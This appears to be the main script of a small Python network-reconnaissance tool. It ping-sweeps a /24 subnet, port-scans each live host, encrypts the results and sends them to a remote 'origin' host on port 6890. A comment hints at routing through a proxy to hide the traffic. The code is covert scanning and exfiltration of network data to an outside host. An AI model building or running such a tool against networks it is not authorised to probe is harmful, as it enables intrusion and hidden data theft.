from Sources.PingSweep import *
from Sources.PortScanner import *
from Sources.Comms import *
from Sources.Cypher import *
from Sources.Client import *

localMap = {}


def main(mask, OS):
    global localMap
    localMap = pingSweep(mask, OS)
    for ip,portList in localMap.items():
        localMap[ip] = portScan(ip)
    print(localMap)
    message = encode(key,str(localMap))
    print(decode(key,client_send(origin,6890,message)))

#@TODO split the /24 network and send parallel communications
#@TODO use the proxy ;)


main("192.168.56.", "UNIX")
